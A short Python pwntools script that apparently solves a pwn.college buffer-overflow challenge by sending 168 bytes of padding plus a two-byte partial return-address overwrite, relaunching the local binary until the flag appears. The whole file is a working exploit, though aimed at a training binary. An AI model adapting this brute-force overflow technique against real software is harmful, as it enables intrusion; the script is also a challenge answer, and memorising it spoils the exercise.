"""Brute-force string length constraint to trigger overflow."""
import itertools

from pwn import *
from pwn import p16, p32, process

binary_path = "/challenge/binary-exploitation-null-write-w"

padding = b"\x00" + b"A" * 167

for count in itertools.count():
    p = process(binary_path)
    win_val = p16(0x2522)
    payload = padding + win_val
    p.send(payload)
    output = p.clean(timeout=0.114514)

    if b"pwn.college{" in output:
        print(f"[+] Try {count}")
        print(output.decode("utf-8", errors="ignore"))
        p.close()
        break
    p.close()
